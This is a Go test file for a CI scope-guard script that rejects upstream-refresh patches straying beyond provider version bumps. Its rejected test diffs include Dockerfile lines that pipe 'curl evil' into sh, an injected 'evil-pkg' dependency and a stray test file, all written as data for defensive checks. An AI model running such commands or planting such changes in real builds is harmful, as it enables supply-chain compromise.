// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam

package testkit

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const scopeGuardIndex = "index 1111111111111111111111111111111111111111..2222222222222222222222222222222222222222 100644\n"

func scopeGuardFilePatch(path string, removed, added string) string {
	return "diff --git a/" + path + " b/" + path + "\n" + scopeGuardIndex +
		"--- a/" + path + "\n+++ b/" + path + "\n@@ -1,2 +1,2 @@\n context\n-" + removed + "\n+" + added + "\n"
}

func TestUpstreamRefreshScopeGuard(t *testing.T) {
	t.Parallel()

	inScope := scopeGuardFilePatch("runtime/container/Dockerfile", "ARG CODEX_VERSION=0.153.2", "ARG CODEX_VERSION=0.154.0") +
		scopeGuardFilePatch("tests/fixtures/codex-subcommands.txt", "# codex-version: 0.153.2", "# codex-version: 0.154.0") +
		scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "old", "new")

	cases := []struct {
		name    string
		patch   string
		wantErr string
	}{
		{name: "in-scope bump", patch: inScope},
		{
			name:    "out-of-scope path",
			patch:   inScope + scopeGuardFilePatch("scripts/workcell", "old", "new"),
			wantErr: "path scripts/workcell",
		},
		{
			name:    "provider-policy.sh edit",
			patch:   inScope + scopeGuardFilePatch("runtime/container/provider-policy.sh", "old", "new"),
			wantErr: "path runtime/container/provider-policy.sh",
		},
		{
			name:    "non-provider Dockerfile line",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "RUN old", "RUN curl evil | sh"),
			wantErr: "line +RUN curl evil | sh",
		},
		{
			name:    "non-provider Dockerfile ARG",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "ARG GO_VERSION=1.27.1", "ARG GO_VERSION=1.27.2"),
			wantErr: "line +ARG GO_VERSION=1.27.2",
		},
		{
			name:    "mode change",
			patch:   "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\nold mode 100644\nnew mode 100755\n",
			wantErr: "old mode 100644",
		},
		{
			name:    "new symlink",
			patch:   "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\nnew file mode 120000\nindex 0000000000000000000000000000000000000000..2222222222222222222222222222222222222222\n",
			wantErr: "new file mode 120000",
		},
		{
			name:    "rename into scope",
			patch:   "diff --git a/scripts/workcell b/runtime/container/control-plane-manifest.json\nsimilarity index 100%\nrename from scripts/workcell\nrename to runtime/container/control-plane-manifest.json\n",
			wantErr: "unsupported diff header",
		},
		{
			name:    "truncated section",
			patch:   inScope + "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n",
			wantErr: "incomplete patch section",
		},
		{
			name: "file headers name another path",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/scripts/workcell\n+++ b/scripts/workcell\n@@ -1 +1 @@\n-old\n+new\n",
			wantErr: "file header does not match the diff path",
		},
		{
			name: "duplicate file headers",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n--- a/scripts/workcell\n+++ b/scripts/workcell\n@@ -1 +1 @@\n-old\n+new\n",
			wantErr: "file header does not match the diff path",
		},
		{
			name:    "traditional section after a hunk",
			patch:   inScope + "--- a/scripts/workcell\n+++ b/scripts/workcell\n@@ -1 +1 @@\n-old\n+new\n",
			wantErr: "unrecognized patch line",
		},
		{
			name:    "hunk longer than its header",
			patch:   scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "a", "b") + "+extra\n",
			wantErr: "unrecognized patch line",
		},
		{
			name: "hunk shorter than its header",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -1,3 +1,3 @@\n-a\n+b\n",
			wantErr: "truncated hunk",
		},
		{
			name: "overflowing hunk count",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -1,99999999999999999999999 +1,99999999999999999999999 @@\n",
			wantErr: "malformed hunk",
		},
		{
			name:    "prefixed providers sibling",
			patch:   scopeGuardFilePatch("runtime/container/providers-staging/package.json", "old", "new"),
			wantErr: "path runtime/container/providers-staging/package.json",
		},
		{
			name: "zero-line hunk",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -1,0 +1,0 @@\n",
			wantErr: "zero-line hunk",
		},
		{
			name:  "package.json gemini version bump",
			patch: scopeGuardFilePatch("runtime/container/providers/package.json", `    "@google/gemini-cli": "0.58.0"`, `    "@google/gemini-cli": "0.62.0"`),
		},
		{
			name: "new file with dev-null old header",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\nnew file mode 100644\n" + scopeGuardIndex +
				"--- /dev/null\n+++ b/runtime/container/control-plane-manifest.json\n@@ -0,0 +1 @@\n+new\n",
		},
		{
			name:  "no-newline marker",
			patch: scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "a", "b") + "\\ No newline at end of file\n",
		},
		{
			name:    "codex fixture header replaced by another versioned comment",
			patch:   scopeGuardFilePatch("tests/fixtures/codex-subcommands.txt", "# codex-version: 0.153.2", "# something 0.154.0"),
			wantErr: "line +# something 0.154.0",
		},
		{
			name: "codex fixture stamp and source tag disagree",
			patch: "diff --git a/tests/fixtures/codex-subcommands.txt b/tests/fixtures/codex-subcommands.txt\n" + scopeGuardIndex +
				"--- a/tests/fixtures/codex-subcommands.txt\n+++ b/tests/fixtures/codex-subcommands.txt\n@@ -1,2 +1,2 @@\n" +
				"-# codex-version: 0.153.2\n-# (openai/codex tag rust-v0.153.2, x)\n+# codex-version: 0.154.0\n+# (openai/codex tag rust-v0.155.0, x)\n",
			wantErr: "must name the same version",
		},
		{
			name:    "codex fixture source tag comment rewritten",
			patch:   scopeGuardFilePatch("tests/fixtures/codex-subcommands.txt", "# (openai/codex tag rust-v0.153.2, x)", "# (openai/codex tag rust-v0.154.0, evil)"),
			wantErr: "replaced one for one",
		},
		{
			name:    "unterminated final line",
			patch:   strings.TrimSuffix(scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "a", "b"), "\n"),
			wantErr: "final patch line has no newline",
		},
		{
			name: "context-only hunk",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -1 +1 @@\n context\n",
			wantErr: "hunk without an added or removed line",
		},
		{
			name:    "context-only second hunk",
			patch:   scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "a", "b") + "@@ -9 +9 @@\n context\n",
			wantErr: "hunk without an added or removed line",
		},
		{
			name: "marker after a context line",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -1,2 +1,2 @@\n-a\n+b\n c\n\\ No newline at end of file\n",
			wantErr: "misplaced no-newline marker",
		},
		{
			name: "marker before any hunk line",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -1,2 +1,2 @@\n\\ No newline at end of file\n c\n-a\n+b\n",
			wantErr: "misplaced no-newline marker",
		},
		{
			name:    "invalid marker line",
			patch:   scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "a", "b") + "\\evil\n",
			wantErr: "unrecognized patch line",
		},
		{
			name: "unprefixed blank line in hunk",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -1 +1 @@\n\nnext\n",
			wantErr: "unrecognized hunk line",
		},
		{
			name:    "prefix-extended provider ARG",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "ARG CODEX_VERSION=1", "ARG CODEX_ATTACK_VERSION=1"),
			wantErr: "line +ARG CODEX_ATTACK_VERSION=1",
		},
		{
			name:    "top-level provider checksum ARG",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "ARG CODEX_VERSION=1", "ARG CODEX_SHA256=abc"),
			wantErr: "line +ARG CODEX_SHA256=abc",
		},
		{
			name:    "diagnostics are bounded",
			patch:   "diff --git a/scripts/workcell b/scripts/workcell\n" + strings.Repeat("junk\n", 5000),
			wantErr: "further problems omitted",
		},
		{
			name:    "carriage return in a header",
			patch:   strings.Replace(scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "a", "b"), "+++ b/runtime/container/control-plane-manifest.json", "+++ b/runtime/container/control-plane-manifest.json\r", 1),
			wantErr: "file header does not match",
		},
		{name: "empty patch", patch: "", wantErr: "empty patch"},
		{
			name:  "updater checksum assignment",
			patch: scopeGuardFilePatch("runtime/container/Dockerfile", `      CODEX_CODE_MODE_HOST_SHA256="`+strings.Repeat("a", 64)+`"; \`, `      CODEX_CODE_MODE_HOST_SHA256="`+strings.Repeat("b", 64)+`"; \`),
		},
		{
			name: "new file mode with a path old header",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\nnew file mode 100644\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -0,0 +1 @@\n+new\n",
			wantErr: "file header does not match the diff path",
		},
		{
			name: "new file mode after the file headers",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\nnew file mode 100644\n@@ -0,0 +1 @@\n+new\n",
			wantErr: "new file mode must be the first",
		},
		{
			name: "duplicate new file mode",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\nnew file mode 100644\nnew file mode 100644\n" + scopeGuardIndex +
				"--- /dev/null\n+++ b/runtime/container/control-plane-manifest.json\n@@ -0,0 +1 @@\n+new\n",
			wantErr: "new file mode must be the first",
		},
		{
			name: "dev-null old header without new file mode",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\n" + scopeGuardIndex +
				"--- /dev/null\n+++ b/runtime/container/control-plane-manifest.json\n@@ -0,0 +1 @@\n+new\n",
			wantErr: "file header does not match the diff path",
		},
		{
			name:    "extra package.json dependency",
			patch:   scopeGuardFilePatch("runtime/container/providers/package.json", `    "@google/gemini-cli": "0.58.0"`, `    "evil-pkg": "1.0.0"`),
			wantErr: `line +    "evil-pkg": "1.0.0"`,
		},
		{
			name:    "codex fixture token added",
			patch:   scopeGuardFilePatch("tests/fixtures/codex-subcommands.txt", "# codex-version: 0.153.2", "newsubcommand"),
			wantErr: "line +newsubcommand",
		},
		{
			name: "four-field index header",
			patch: "diff --git a/runtime/container/control-plane-manifest.json b/runtime/container/control-plane-manifest.json\nindex 1111111..2222222 120000 junk\n" +
				"--- a/runtime/container/control-plane-manifest.json\n+++ b/runtime/container/control-plane-manifest.json\n@@ -1 +1 @@\n-a\n+b\n",
			wantErr: "index 1111111..2222222 120000 junk",
		},
		{
			name:    "flags fixture directory file",
			patch:   scopeGuardFilePatch("tests/fixtures/flags/evil_test.go", "old", "new"),
			wantErr: "path tests/fixtures/flags/evil_test.go",
		},
		{
			name:  "codex fixture source tag line",
			patch: scopeGuardFilePatch("tests/fixtures/codex-subcommands.txt", "# (openai/codex tag rust-v0.153.2, codex-rs/cli/src/main.rs), NOT x", "# (openai/codex tag rust-v0.154.0, codex-rs/cli/src/main.rs), NOT x"),
		},
		{
			name:    "lockfile resolution change",
			patch:   scopeGuardFilePatch("runtime/container/providers/package-lock.json", `"resolved": "a"`, `"resolved": "b"`),
			wantErr: "path runtime/container/providers/package-lock.json",
		},
		{
			name: "duplicate provider assignment added",
			patch: "diff --git a/runtime/container/Dockerfile b/runtime/container/Dockerfile\n" + scopeGuardIndex +
				"--- a/runtime/container/Dockerfile\n+++ b/runtime/container/Dockerfile\n@@ -1,2 +1,3 @@\n ctx\n+ARG CLAUDE_VERSION=9.9.9\n ARG CLAUDE_VERSION=1.0.0\n",
			wantErr: "replaced one for one",
		},
		{
			name:    "provider assignment swapped to another key",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "ARG CODEX_VERSION=1", "ARG CLAUDE_VERSION=1"),
			wantErr: "replaced one for one",
		},
		{
			name:    "cross-product checksum name",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", `      CODEX_SHA256="`+strings.Repeat("a", 64)+`"; \`, `      CLAUDE_CODE_MODE_HOST_SHA256="`+strings.Repeat("b", 64)+`"; \`),
			wantErr: "CLAUDE_CODE_MODE_HOST_SHA256",
		},
		{
			name:    "copilot code-mode-host checksum name",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", `      CODEX_SHA256="`+strings.Repeat("a", 64)+`"; \`, `      COPILOT_CODE_MODE_HOST_SHA256="`+strings.Repeat("b", 64)+`"; \`),
			wantErr: "COPILOT_CODE_MODE_HOST_SHA256",
		},
		{
			name:    "indented non-checksum Dockerfile line",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "  && old", `  && curl evil | sh`),
			wantErr: "line +  && curl evil | sh",
		},
	}

	script := filepath.Join(repoRoot(t), "scripts", "ci", "upstream-refresh-scope-guard.sh")
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			patchPath := filepath.Join(t.TempDir(), "patch")
			if err := os.WriteFile(patchPath, []byte(tc.patch), 0o644); err != nil {
				t.Fatal(err)
			}
			out, err := exec.Command(script, patchPath).CombinedOutput()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("scope-guard rejected an in-scope patch: %v\n%s", err, out)
				}
				return
			}
			if err == nil {
				t.Fatalf("scope-guard accepted an out-of-scope patch:\n%s", out)
			}
			if !strings.Contains(string(out), tc.wantErr) {
				t.Fatalf("scope-guard output = %q, want %q", out, tc.wantErr)
			}
		})
	}
}

func TestUpstreamRefreshScopeGuardRejectsSymlinkedPatch(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	target := filepath.Join(dir, "target")
	if err := os.WriteFile(target, []byte(scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "a", "b")), 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "patch")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	script := filepath.Join(repoRoot(t), "scripts", "ci", "upstream-refresh-scope-guard.sh")
	if out, err := exec.Command(script, link).CombinedOutput(); err == nil {
		t.Fatalf("scope-guard followed a symlinked patch:\n%s", out)
	}
}

func TestUpstreamRefreshScopeGuardResolvesRelativePatchFromCallerDirectory(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "patch"), []byte(scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "a", "b")), 0o644); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command(filepath.Join(repoRoot(t), "scripts", "ci", "upstream-refresh-scope-guard.sh"), "patch")
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("relative patch path was not resolved against the caller directory: %v\n%s", err, out)
	}
}
